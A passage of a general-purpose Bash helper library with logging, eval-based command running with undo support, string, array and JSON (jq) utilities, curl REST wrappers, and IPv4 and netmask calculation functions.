    # # --notags
    local item=$(whiptail --title "${title}" \
        --menu "${menu}" 0 0 0 \
        "${items[@]}" 3>&1 1>&2 2>&3 || true)
    safe_echo "${item}"
}
##################################################
# Assign variable one scope above the caller
# Usage: local "$1" && upvar $1 "value(s)"
# Param: $1  Variable name to assign value to
# Param: $*  Value(s) to assign.  If multiple values, an array is
#            assigned, otherwise a single value is assigned.
# Example:
#    f() { local b; g b; echo $b; }
#    g() { local "$1" && upvar $1 bar; }
#    f  # Ok: b=bar
upvar() {
    if unset -v "$1"; then           # Unset & validate varname
        if (( $# == 2 )); then
            eval $1=\"\$2\"          # Return single value
        else
            eval $1=\(\"\${@:2}\"\)  # Return array
        fi
    fi
}

# item=(ERR SUM)
# safe_read_cfg demo.cfg item
# echo "OK =${OK:-oo},ERR=$ERR"
safe_read_cfg()
{
    local cfg="${1}"
    local allow_array="${2}"
    [ -f "$cfg" ] || return 1
    local i=0
    local len=$(array_size "${allow_array}")
    local pattern=$(array_get $allow_array 0)
    for (( i=1; i<len; ++i )); do
        pattern="$pattern|$(array_get $allow_array $i)"
    done
    source <(grep -E "^\s*($pattern)=" $cfg)
}

getinientry() {
    local CONF=$1
    grep "^\[" "${CONF}" | sed "s/\[//;s/\]//"
}

readini() {
    local ENTRY=$1
    local CONF=$2
    local INFO=$(grep -v ^$ "${CONF}"\
        | sed -n "/\[${ENTRY}\]/,/^\[/p" \
        | grep -v ^'\[') && eval "${INFO}"
}
##################################################
# C__END=$(tput sgr0)                         #  reset flag
# C__BLA=$C__END$(tput setaf 0)               #  black
# C__RED=$C__END$(tput setaf 1)               #  red
# C__GRE=$C__END$(tput setaf 2)               #  green
# C__YEL=$C__END$(tput setaf 3)               #  yellow
# C__BLU=$C__END$(tput setaf 4)               #  blue
# C__MAG=$C__END$(tput setaf 5)               #  magenta
# C__CYA=$C__END$(tput setaf 6)               #  cyan
# C__WHI=$C__END$(tput setaf 7)               #  white
# C__BOL=$(tput bold)                         ## bold flag
# C__BOL_BLA=$C__END$C__BOL$(tput setaf 0)    #  black
# C__BOL_RED=$C__END$C__BOL$(tput setaf 1)    #  red
# C__BOL_GRE=$C__END$C__BOL$(tput setaf 2)    #  green
# C__BOL_YEL=$C__END$C__BOL$(tput setaf 3)    #  yellow
# C__BOL_BLU=$C__END$C__BOL$(tput setaf 4)    #  blue
# C__BOL_MAG=$C__END$C__BOL$(tput setaf 5)    #  magenta
# C__BOL_CYA=$C__END$C__BOL$(tput setaf 6)    #  cyan
# C__BOL_WHI=$C__END$C__BOL$(tput setaf 7)    #  white

# {{ LOG functions start
LOG_ERROR=0       # Level error
LOG_WARNING=1     # Level warning
LOG_INFO=2        # Level info
LOG_INFO1=3       # Level info
LOG_INFO2=4       # Level info
LOG_INFO3=5       # Level info
LOG_DEBUG=6       # Level debug

# Log level names
LOG_LEVELNAMES=('E' 'W' 'I' 'I' 'I' 'I' 'D')

log_level=5
# Default date fmt
date_fmt='%Y-%m-%d %H:%M:%S'
# Default log fmt
log_fmt="[<levelname>] [<asctime>] <message>"
# Default log color
log_color=('red' 'yellow' 'green' 'purple' 'blue' 'white' 'cyan')
# log_syslog defined, syslog enabled and log_syslog value as  syslog tag
# log_syslog="mysyslog"

# Print log messages
# $1: Log level
# $2: C style printf fmt
# $3: C style printf arguments
do_log() {
    local level=$1
    local msg="$2"
    local fmt="${log_fmt}"

    if [ $level -gt $log_level ]; then
        return
    fi

    fmt="${fmt//<levelname>/${LOG_LEVELNAMES[$level]}}"
    fmt="${fmt//<asctime>/$(date +"$date_fmt")}"
    fmt="${fmt//<message>/$msg}"
    defined log_syslog && {
        shift 2 && ${log_color[level]:-printf} "☠️ $fmt" "$@" | logger -t "${log_syslog:-shell_log}"
    } || {
        shift 2 && ${log_color[level]:-printf} "☠️🐮 $fmt" "$@" >&2
    }
}

debug_msg() {
    local fmt=$1
    shift && do_log $LOG_DEBUG "$fmt" "$@"
}

info_msg() {
    local fmt=$1
    shift && do_log $LOG_INFO "$fmt" "$@"
}

warn_msg() {
    local fmt=$1
    shift && do_log $LOG_WARNING "$fmt" "$@"
}

error_msg() {
    local fmt=$1
    shift && do_log $LOG_ERROR "$fmt" "$@"
}

info1_msg() {
    local fmt=$1
    shift && do_log $LOG_INFO1 "$fmt" "$@"
}

vinfo1_msg() {
    while IFS='\n' read line || [ -n "$line" ]; do
        info1_msg "$line\n"
    done
}

info2_msg() {
    local fmt=$1
    shift && do_log $LOG_INFO2 "$fmt" "$@"
}

vinfo2_msg() {
    while IFS='\n' read line || [ -n "$line" ]; do
        info2_msg "$line\n"
    done
}

info3_msg() {
    local fmt=$1
    shift && do_log $LOG_INFO3 "$fmt" "$@"
}

vinfo3_msg() {
    while IFS='\n' read line || [ -n "$line" ]; do
        info3_msg "$line\n"
    done
}

# echo "$_out"|vinfo_msg
vinfo_msg() {
    while IFS='\n' read line || [ -n "$line" ]; do
        info_msg "$line\n"
    done
}

verror_msg() {
    while IFS='\n' read line || [ -n "$line" ]; do
        error_msg "$line\n"
    done
}

exit_msg() {
    error_msg "$@"
    exit 1
}

red() {
    defined QUIET && return
    local fmt=$1
    stderr_is_terminal && fmt="\033[1;31m${fmt}\033[0m"
    shift && printf "${fmt}" "$@"
}

green() {
    defined QUIET && return
    local fmt=$1
    stderr_is_terminal && fmt="\033[1;32m${fmt}\033[0m"
    shift && printf "${fmt}" "$@"
}

yellow() {
    defined QUIET && return
    local fmt=$1
    stderr_is_terminal && fmt="\033[1;33m${fmt}\033[0m"
    shift && printf "${fmt}" "$@"
}

blue() {
    defined QUIET && return
    local fmt=$1
    stderr_is_terminal && fmt="\033[1;34m${fmt}\033[0m"
    shift && printf "${fmt}" "$@"
}

cyan() {
    defined QUIET && return
    local fmt=$1
    stderr_is_terminal && fmt="\033[1;36m${fmt}\033[0m"
    shift && printf "${fmt}" "$@"
}

purple() {
    defined QUIET && return
    local fmt=$1
    stderr_is_terminal && fmt="\033[1;35m${fmt}\033[0m"
    shift && printf "${fmt}" "$@"
}

white() {
    defined QUIET && return
    local fmt=$1
    stderr_is_terminal && fmt="\033[1;38m${fmt}\033[0m"
    shift && printf "${fmt}" "$@"
}

#set_loglevel ${LOG_DEBUG}
set_loglevel() {
    if echo "$1" | grep -qE "^[0-9]+$"; then
        log_level="$1"
    fi
}

# Set log format
set_logfmt() {
    if [ -n "$1" ]; then
        log_fmt="$1"
    fi
}

# Set date format, see 'man date'
set_datefmt() {
    if [ -n "$1" ]; then
        date_fmt="$1"
    fi
}
# LOG functions end }}

truecmd() {
    type -P $1
}

require() {
    local cmd=
    local err=0
    for cmd in $@ ; do
        command -v "${cmd}" &> /dev/null || { warn_msg "require $cmd\n"; err=1; }
        #[ "$(command -v "$cmd")" ] || exit_msg "require $cmd\n"
    done
    [ "${err}" == "0" ] || exit_msg "command check no passed\n"
}

debugshell() {
    safe_echo "This is a debug shell (${1:-})."
    sh || true
    #PS1='(initramfs) ' sh -i </dev/console >/dev/console 2>&1
}

run_scripts() {
    local i= initdir=${1}
    [ ! -d "${initdir}" ] && return
    shift
    for i in ${initdir}/*; do
       # . "${initdir}/$i"
       cat "${initdir}/$i" | try
    done
}

#******************************************************************************
# try: Execute a command with error checking.  Note that when using this, if a piped
# command is used, the '|' must be escaped with '\' when calling try (i.e.
# "try ls \| less").
# Examples:
#  try my_command ${args} || return ${?}
#  try echo "log" \> log
#  cmds="
#    touch log
#    exit 0
#  "
#  try <<< $cmds
#  echo "$cmds" | try
#  cat <<EOF | try
#    echo hello >> log
#    exit 1
#  EOF
#  echo -n ${cli_prikey} | try wg pubkey
#  try "bash -s" <<EOF
#      ifconfig
#      start-stop-daemon --start --quiet --background --exec '/sbin/zebra'
#  EOF
#  #########################
#  BUG: when DRYRUN defined
#  DRYRUN: echo 1.1.1.1/24 dev
#  2.2.2.2/32,
#  while read -rd "," _lval && [ -n "${_lval}" ]; do
#      try "echo ${_lval} dev"
#  done <<< "1.1.1.1/24,2.2.2.2/32,"
#      0</dev/null try "echo ${_lval} dev" # can fix bug :(
#******************************************************************************
try() {
    # stdin is redirect and has parm, so stdin is not cmd stream!!
    local cmds="${@:-$(cat)}"
    local cmd_size=-60.60 retval=
    defined DRYRUN && { blue>&2 "DRYRUN: ";purple>&2 "$cmds\n"; stdin_is_terminal || cat >&2; return 0; }
    stderr_is_terminal || cmd_size=    #stderr is redirect show all cmd
    blue>&2 "Begin: ";purple>&2 "%${cmd_size}s." "$cmds"
    __ret_out= __ret_err= __ret_rc=0
    # eval -- "$( ($@ ; exit $?) \
    local start_time=$(date +%s.%N)
    eval -- "$( (eval "$cmds";exit $?;) \
        2> >(__ret_err=$(cat); typeset -p __ret_err;) \
        1> >(__ret_out=$(cat); typeset -p __ret_out;); __ret_rc=$?; typeset -p __ret_rc; )"
    local elapsed_time=$(date +%s.%N --date="${start_time} seconds ago")
    [ ${__ret_rc} = 0 ] && green>&2 " (%.4f)done.\n" ${elapsed_time}
    [ ${__ret_rc} = 0 ] || {
        local cmd_func="" #"${FUNCNAME[1]}"
        for (( idx=${#FUNCNAME[@]}-1 ; idx>=1 ; idx-- )) ; do
            cmd_func+="${FUNCNAME[idx]} "
        done
        local cmd_line="${BASH_LINENO[1]}"
        red>&2 " (${elapsed_time})failed(${cmd_func}:${cmd_line} [${__ret_rc}]).\n"
    }
    [ -z "${__ret_out}" ] || cat <<< "${__ret_out}"
    [ -z "${__ret_err}" ] || cat >&2 <<< "${__ret_err}"
    retval=${__ret_rc}
    unset __ret_out __ret_err __ret_rc
    return ${retval}
}

# undo command
# add_undo ls /home \> /root/cat
# add_undo "cat /etc/rc.local > /root/333aa"
# run_undo
rollback_cmds=()
run_undo() {
    local cmd= idx=
    [ ${#rollback_cmds[@]} -gt 0 ] || return 0
    # Run all "undo" commands if any.
    for (( idx=${#rollback_cmds[@]}-1 ; idx>=0 ; idx-- )) ; do
        cmd="${rollback_cmds[idx]}"
        purple "UNDO -> "
        try "$(eval printf '%s' "$cmd")" || true
    done
    rollback_cmds=()
    return 0
}
add_undo() {
    local cmd="$(printf '%q ' "$*")"
    array_append rollback_cmds "$cmd"
    return 0
}
## Tests if a variable is defined.
## @param variable Variable to test.
## @retval 0 if the variable is defined.
## @retval 1 in others cases.
defined() {
    [[ "${!1-X}" == "${!1-Y}" ]]
}

function_exists() {
    declare -f -F $1 >/dev/null
    return $?
}

directory_exists() {
    [ -d "$1" ]
}

link_exists() {
    [ -h "$1" ]
}

file_exists() {
    [ -e "$1" ]
}

regular_file_exists() {
    [ -f "$1" ]
}

device_exists() {
    [ -b "$1" ]
}

is_integer() {
    [[ "$1" =~ ^[0-9]+$ ]]
}

to_lower() {
    echo "${*,,}"
    #echo "$1" | tr '[:upper:]' '[:lower:]'
}

to_upper() {
    echo "${*^^}"
    #echo "$1" | tr '[:lower:]' '[:upper:]'
}
trim() {
    local var="$*"
    var="${var#"${var%%[![:space:]]*}"}"   # remove leading whitespace characters
    var="${var%"${var##*[![:space:]]}"}"   # remove trailing whitespace characters
    echo -n "$var"
}
strip_dup() {
    echo $@ | tr -s '[:space:]' '\n' | awk '!x[$0]++'
}
# returns OK if $1 contains $2 at the beginning
str_starts() {
    [ "${1#$2*}" != "$1" ]
}
# returns OK if $1 contains $2 at the end
str_ends() {
    [ "${1%*$2}" != "$1" ]
}
# returns OK if $1 contains $2
strstr() {
    [ "${1#*$2*}" != "$1" ]
}
str_equal() {
    [ "${1:-x}" == "${2:-y}" ]
}
# replaces all occurrences of 'search' in 'str' with 'replacement'
# str_replace str search replacement
# example:
# str_replace '  one two  three  ' ' ' '_'
str_replace() {
    local in="$1"; local s="$2"; local r="$3"
    local out=''

    while strstr "${in}" "$s"; do
        chop="${in%%$s*}"
        out="${out}${chop}$r"
        in="${in#*$s}"
    done
    echo "${out}${in}"
}

split() {
    # Usage: split "string" "delimiter"
    IFS=$'\n' read -d "" -ra arr <<< "${1//$2/$'\n'}"
    safe_echo '%s' "${arr[@]}"
}

array_append() {
    local array=$1; shift
    local len=$(array_size "$array")
    for i in "$@"; do
        eval "$array[$len]=\"$i\""
        let len=len+1
    done
}

array_size() {
    eval "echo \"\${#$1[@]}\""
}
# when "${ids[@]}" give a space-separated string,
# "${ids[*]}" (with a star * instead of the at sign @)
# will render a string separated by the first character of $IFS.
array_print() {
    eval "printf '%s\n' \"\${$1[@]}\""
}

array_print_label() {
    eval "printf '%s\n' \"\${!$1[@]}\""
}

array_label_exist() {
    eval "[ \${$1[$2]+t} ]"
}

array_set() {
    eval "$1[$2]=\"$3\""
}

array_get() {
    eval "printf '%s' \"\${$1[$2]}\""
}

urlencode() {
    local string="${1}"
    local strlen=${#string}
    local encoded=""
    local pos c o
    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c" ;;
        esac
        encoded+="${o}"
    done
    safe_echo "${encoded}"
}

urldecode() {
    local data="${*//+/ }"
    printf '%b' "${data//%/\\x}"
}

# echo "key=abc" | del_config "key" | add_config "test" "testval" | set_config "test" "abc"
set_config() {
    local CONF_DELM=${3:-=}
    sed "s/^\($1\s*${CONF_DELM}\s*\).*\$/\1$2/"
}

del_config() {
    local CONF_DELM=${2:-=}
    sed "/^\($1\s*${CONF_DELM}\s*\).*\$/d"
}

add_config() {
    local CONF_DELM=${3:-=}
    del_config "$1" "${CONF_DELM}"
    echo "$1${CONF_DELM}$2"
}

# cat conf | get_config "cluster network"
get_config() {
    local CONF_DELM=${3:-=}
    sed --quiet "s/^$1\s*${CONF_DELM}\s*\(.*\)/\1/p"
}

# ID=100
# ARR=(a b c)
# DIC=(key1=a key2=b key3=c)
# cat <<EOF | json --arg id "$ID"  --argjson val "$ID" '."id"=$id | ."val"=$val' | json ".dummy=\"mesg\""
# {"foo":"bar" }
# EOF
# json --arg id "$ID" -n '{"id": $id}' | json --arg ssid abc --arg pass 12333 '.connections[$ssid] = $pass'
# json_dict driver="xx" id="$ID" "${DIC[@]}" |  json ".fuck=111"
# json --arg path "mypath" \
#      --arg input "$(echo "$ID" | base64)" \
#      --argjson arr "$(json_array ${ARR[@]})" \
#      --argjson params "$(json_dict "${DIC[@]}")" \
#      -n '{"path": $path, "input-data": $input, "arr": $arr, "props": $params}'
# cat <<EOF | json .path=\"mypath\" | json .arr="$(json_array ${ARR[@]})" | json .props="$(json_dict "${DIC[@]}")" \
#           | json ".props[\"mykey\"] = \"myval\"" \
#           | json ".arr[.arr | length] = \"999\"" \
#           | json "del(.arr[0])"
# {
#     "foo" : "bar",
#     "path": 1,
#     "input-data": "$(echo $ID | base64)",
#     "arr": 1,
#     "props": 1
# }
# EOF
# str="$(json_array ${ARR[@]})"
# len=$(echo ${str} |json ". | length")
# # for ((i=0;i<len;i++)); do
# for i in $(echo ${str} | json "range(. | length)");do
#     echo ${str} | json ".[$i]"
# done
json() {
    jq -cM "$@"
}

json_array() {
    for i in "$@"; do
        jq -cMn --arg arg "${i}" '$arg'
    done | jq -cMs .
}

json_dict() {
    local delm="="
    for i in "$@"; do
        jq -cMn --arg val "${i#*${delm}}" '{"'${i%%${delm}*}'": $val}'
    done | jq -cMs 'add // {}'
}

# {
#     "partitions": {
#         "boot_size": "67108864"
#     },
#     "debian": {
#         "release": "wheezy",
#         "packages": [ "openssh-server1", "openssh-server2", "openssh-server3" ]
#     }
# }
# json_config ".debian.packages[]" conf.json
# cat conf.json | json_config ".debian.packages[]"
# json_config ".debian.packages[]" <<< "$(cat conf.json)"
# get all keys
# json_config "keys[]" <<< "$(cat conf.json)"
# while IFS='' read -r line; do
#     echo $line
# done < <(json_config "keys[]" conf.json)
# mapfile -t arr < <(json_config "keys[]" conf.json) # bash 4+
# json_config "keys_unsorted | @sh" conf.json
json_config() {
    local key=${1}
    local str=""
    [ $# = 1 ] && {
        str="$(cat)"
    } || {
        str="$(cat ${2:?json_config input err})"
    }
    jq -r "(${key})? // empty" <<< ${str}
}
# get second argument if first one not found
json_config_default() {
    local key=${1}
    local default=${2}
    local str=""
    [ $# = 2 ] && {
        str="$(cat)"
    } || {
        str="$(cat ${3:?json_config input err})"
    }
    jq -r '('${key}') // "'${default}'"' <<< ${str}
}

rest_json_post() {
    local url="${1}"
    local file=${2}  # -/filename stdin/file
    if [ -z $3 ]; then
        #without -s curl could display some debug info
        curl -k -s -H "Accept:application/json" -H "Content-Type:application/json" -X POST -d "@${file}" ${url}
    else
        curl -k -s -H "Accept:application/json" -H "Content-Type:application/json" -X POST -u "$3":"$4" -d "@${file}" ${url}
    fi
}

rest_json_get() {
    local url="${1}"
    if [ -z $2 ]; then
        curl -k -H "Accept: application/json" ${url}
    else
        curl -k -H "Accept: application/json" -u "$2":"$3" ${url}
    fi
}

gen_addrv4() {
    local mac=$(cat "/sys/class/net/$1/address")
    IFS=':'; set $mac; unset IFS
    [ "$6" = "ff" -o "$6" = "00" ] && set $1 $2 $3 $4 $5 "01"
    printf "10.%d.%d.%d" 0x$4 0x$5 0x$6
}

gen_addrv6() {
    local mac=$(cat "/sys/class/net/$1/address")
    IFS=':'; set $mac; unset IFS
    printf fdef:17a0:ffb1:300:$(printf %02x $((0x$1 ^ 2)))$2:${3}ff:fe$4:$5$6
}

ip2int() {
    local a b c d
    { IFS=. read a b c d; } <<< $1
    safe_echo $(((((((a << 8) | b) << 8) | c) << 8) | d))
}

int2ip() {
    safe_echo "$((${1}>>24&255)).$((${1}>>16&255)).$((${1}>>8&255)).$((${1}&255))"
}

is_ipv4() {
    echo "$1" | {
        IFS=. read a b c d
        test "$a" -ge 0 -a "$a" -le 255 \
             -a "$b" -ge 0 -a "$b" -le 255 \
             -a "$c" -ge 0 -a "$c" -le 255 \
             -a "$d" -ge 0 -a "$d" -le 255 \
             2> /dev/null
    } && return 0
    return 1
}
is_fqdn() {
    safe_echo "$1" | grep -Pq '(?=^.{4,255}$)(^((?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.)+[a-zA-Z]{2,63}\.?$)'
    return $?
}
is_ipv4_netmask() {
    is_ipv4 "$1" || return 1
    IFS='.' read -r ipb[1] ipb[2] ipb[3] ipb[4] <<< "$1"
    local -r list_msb='0 128 192 224 240 248 252 254'
    for i in {1,2,3,4}; do
        if [[ ${rest_to_zero:-0} = 1 ]]; then
            [[ ${ipb[i]} -eq 0 ]] || return 1
        else
            if [[ $list_msb =~ (^|[[:space:]])${ipb[i]}($|[[:space:]]) ]]; then
                local -r rest_to_zero=1
            elif [[ ${ipb[i]} -eq 255 ]]; then
                continue
            else
                return 1
            fi
        fi
    done
    return 0
}
is_ipv4_cidr() {
    local -r regex='^[[:digit:]]{1,2}$'
    [[ $1 =~ $regex ]] || return 1
    [ "$1" -gt 32 ] || [ "$1" -lt 0 ] && return 1
    return 0
}
is_ipv4_subnet() {
    IFS='/' read -r tip tmask <<< "$1"
    is_ipv4_cidr "$tmask" || return 1
    is_ipv4 "$tip" || return 1
    return 0
}
get_ipv4_network() {
    is_ipv4 "$1" || return 1
    is_ipv4_netmask "$2" || return 1
    IFS='.' read -r ipb1 ipb2 ipb3 ipb4 <<< "$1"
    IFS='.' read -r mb1 mb2 mb3 mb4 <<< "$2"
    safe_echo "$((ipb1 & mb1)).$((ipb2 & mb2)).$((ipb3 & mb3)).$((ipb4 & mb4))"
}
get_ipv4_broadcast() {
    is_ipv4 "$1" || return 1
    is_ipv4_netmask "$2" || return 1
    IFS='.' read -r ipb1 ipb2 ipb3 ipb4 <<< "$1"
    IFS='.' read -r mb1 mb2 mb3 mb4 <<< "$2"
    nmb1=$((mb1 ^ 255))
    nmb2=$((mb2 ^ 255))
    nmb3=$((mb3 ^ 255))
    nmb4=$((mb4 ^ 255))
    safe_echo "$((ipb1 | nmb1)).$((ipb2 | nmb2)).$((ipb3 | nmb3)).$((ipb4 | nmb4))"
}
mask2cidr() {
    is_ipv4_netmask "$1" || return 1
    local x=${1##*255.}
    set -- 0^^^128^192^224^240^248^252^254^ $(( (${#1} - ${#x})*2 )) "${x%%.*}"
    x=${1%%$3*}
    safe_echo $(( $2 + (${#x}/4) ))
}
cidr2mask() {
    is_ipv4_cidr "$1" || return 1
    local i mask=""
    local full_octets=$(($1/8))
    local partial_octet=$(($1%8))
    for ((i=0;i<4;i+=1)); do
        if [ $i -lt $full_octets ]; then
            mask+=255
        elif [ $i -eq $full_octets ]; then
            mask+=$((256 - 2**(8-partial_octet)))
        else
            mask+=0
        fi

        test $i -lt 3 && mask+=.
    done
    safe_echo $mask
}
if ([ "$0" = "$BASH_SOURCE" ] || ! [ -n "$BASH_SOURCE" ]);
then
    list_func
fi
